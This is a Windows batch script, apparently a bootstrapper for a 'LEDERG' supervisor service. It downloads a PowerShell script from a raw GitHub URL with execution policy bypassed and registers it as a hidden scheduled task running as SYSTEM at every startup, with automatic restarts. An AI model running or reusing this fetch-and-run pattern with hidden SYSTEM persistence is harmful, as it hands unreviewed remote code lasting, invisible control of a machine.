@echo off
setlocal
set "BOOT_DIR=C:\LEDERG-MESSENGER-BOOT"
set "SUPERVISOR=%BOOT_DIR%\supervisor.ps1"
set "TMP=%BOOT_DIR%\supervisor.new.ps1"
set "RAW=https://raw.githubusercontent.com/LEDERG777-TEXNARIC/LEDERG-GOLDEX/main/scripts/supervisor.ps1"
set "STARTUP=%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"

if not exist "%BOOT_DIR%" mkdir "%BOOT_DIR%"
if not exist "%STARTUP%" mkdir "%STARTUP%"

where powershell.exe >nul 2>nul
if errorlevel 1 exit /b 1

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop';$u='%RAW%';$p='%TMP%';$c=(Invoke-WebRequest -UseBasicParsing -Uri $u -TimeoutSec 20).Content;if([string]::IsNullOrWhiteSpace($c)){throw 'Empty supervisor'};$e=New-Object System.Text.UTF8Encoding($false);[IO.File]::WriteAllText($p,$c,$e)"
if errorlevel 1 (
  if not exist "%SUPERVISOR%" exit /b 1
) else (
  move /Y "%TMP%" "%SUPERVISOR%" >nul
)

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop';$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\LEDERG-MESSENGER-BOOT\supervisor.ps1""';$t=New-ScheduledTaskTrigger -AtStartup;$s=New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Days 3650) -RestartCount 20 -RestartInterval (New-TimeSpan -Minutes 1);$p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;$task=New-ScheduledTask -Action $a -Trigger $t -Settings $s -Principal $p;Register-ScheduledTask -TaskName 'LEDERG-AUTOPILOT' -InputObject $task -Force | Out-Null"
if errorlevel 1 exit /b 1

schtasks /Run /TN "LEDERG-AUTOPILOT" >nul 2>&1
exit /b 0
